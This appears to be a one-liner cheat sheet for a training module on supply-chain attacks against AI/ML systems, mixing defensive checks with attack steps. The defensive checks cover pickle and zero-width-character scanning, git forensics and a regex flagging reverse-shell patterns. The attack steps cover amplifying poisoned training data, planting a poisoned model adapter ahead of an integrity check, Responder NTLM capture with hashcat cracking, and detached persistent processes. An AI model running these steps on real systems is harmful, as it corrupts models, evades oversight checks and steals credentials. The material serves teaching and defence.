#!/bin/bash
# oneliners.sh
# Module: 08 — Supply Chain Attacks on AI/ML Systems
# Purpose: Quick reference one-liners for supply chain attack and defense tasks

# ─── PICKLE SCANNING ───────────────────────────────────────────────────────────

# Scan a single .pt file for dangerous GLOBAL opcodes
picklescan -p model.pt

# Scan entire model registry recursively
picklescan -p /srv/models/registry/

# Fickling advanced analysis
fickling --check model.pt
fickling --decompile model.pt | grep -i "GLOBAL\|os\.\|subprocess\|socket"

# Safe model load (PyTorch 2.6+ — blocks pickle RCE)
python3 -c "import torch; m = torch.load('model.pt', weights_only=True); print('Safe load OK')"

# ─── ZERO-WIDTH UNICODE ─────────────────────────────────────────────────────────

# Check a Python file for zero-width characters (hex dump)
cat -A target.py | grep -P '[\x{200B}-\x{200F}]'
python3 -c "
data = open('target.py','rb').read()
for i,b in enumerate(data):
    if b in (0xe2,): # Start of ZWC UTF-8 sequence
        seq = data[i:i+3]
        if seq in (b'\xe2\x80\x8b', b'\xe2\x80\x8c'):
            print(f'ZWC at byte {i}: {seq.hex()}')
"

# Find ZWC in all repo Python files
git ls-files '*.py' | xargs -I{} python3 -c "
import sys
data = open('{}','rb').read()
if b'\xe2\x80\x8b' in data or b'\xe2\x80\x8c' in data:
    print('ZWC FOUND: {}')
"

# ─── GIT FORENSICS ─────────────────────────────────────────────────────────────

# Show commits that changed a specific file (follow renames)
git log --all --follow -p -- server.py

# Find commits with near-zero visible diff (possible ZWC insertion)
git log --stat | grep -A2 "1 file changed, 0 insertions"

# Get clean version of file from initial commit
git show $(git rev-list --max-parents=0 HEAD):server.py > server_clean.py

# ─── TRAINING DATA ─────────────────────────────────────────────────────────────

# Count lines in JSONL training file
wc -l train.jsonl

# Scan completions for shell command patterns
python3 -c "
import json, re
DANGER = re.compile(r'ProxyCommand|nc -[we]|/dev/tcp|wget http|curl.*\d{1,3}\.\d{1,3}|bash -i')
with open('train.jsonl') as f:
    for i,line in enumerate(f):
        ex = json.loads(line)
        c = ex.get('completion','')
        if DANGER.search(c):
            print(f'Line {i}: {c[:80]}')
"

# Amplify training poison ×10
python3 -c "
lines = open('poison.jsonl').readlines()
with open('amplified.jsonl','w') as f:
    for _ in range(10):
        f.writelines(lines)
print('Done:', 10*len(lines), 'examples')
"

# ─── TOKENIZER ─────────────────────────────────────────────────────────────────

# Check current token IDs
python3 -c "
import json
v = json.load(open('vocab.json'))
tokens = ['MAL','FUN','MALICIOUS','FUNICIOUS']
for t in tokens:
    if t in v: print(f'{t}: {v[t]}')
"

# Verify both files are in sync after swap
python3 -c "
import json
v = json.load(open('vocab.json'))
t = json.load(open('tokenizer.json'))['model']['vocab']
for tok in ['MAL','FUN']:
    print(f'{tok}: vocab={v.get(tok)} tok={t.get(tok)} match={v.get(tok)==t.get(tok)}')
"

# ─── ADAPTER REGISTRY ──────────────────────────────────────────────────────────

# List adapters by mtime (newest first)
ls -lt /srv/models/registry/ | head -20

# Atomic adapter deployment (exploits mtime-based selection)
name="zz-poison-$(date +%s)"
stage="/tmp/$name"
cp -a ~/poisoned-adapter "$stage"
touch "$stage/adapter_model.safetensors"   # Ensure newest mtime
mv "$stage" "/srv/models/registry/$name"   # Atomic rename
echo "[+] Deployed $name — ~4:54 window before integrity check"

# Monitor registry for new adapter arrivals
inotifywait -m /srv/models/registry/ -e create -e moved_to

# ─── CREDENTIAL CAPTURE ────────────────────────────────────────────────────────

# Start Responder to capture NTLMv2 (when workstations follow model-output SMB paths)
sudo responder -I eth0 -rdwv

# Crack NTLMv2 hash (Responder output format)
hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack Linux shadow SHA-512
hashcat -m 1800 shadow_hash.txt /usr/share/wordlists/rockyou.txt

# ─── PROCESS PERSISTENCE ───────────────────────────────────────────────────────

# Spawn detached subprocess (survives parent terminate)
python3 -c "
import subprocess, sys
p = subprocess.Popen(
    ['python3', '-c', 'import time; time.sleep(999)'],
    start_new_session=True,    # Detach from parent process group
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)
print(f'[+] Detached PID: {p.pid}')
sys.exit(0)  # Parent exits — child keeps running
"
